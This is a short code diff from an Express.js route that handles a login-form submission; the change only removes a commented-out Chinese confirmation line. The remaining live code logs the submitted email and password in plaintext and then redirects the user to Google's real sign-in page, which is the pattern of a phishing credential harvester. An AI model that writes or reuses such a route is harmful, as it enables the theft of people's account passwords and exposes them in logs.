@@ -21,7 +21,6 @@ router.post('/submit-your-login-form', (req, res) => {
   const password = req.body.password;
   console.log(`Email: ${email}`);
   console.log(`Password: ${password}`);
-  // res.send('登录表单已提交');
   res.redirect('https://accounts.google.com/Login');
 });
 router.get("/", function (req, res) {
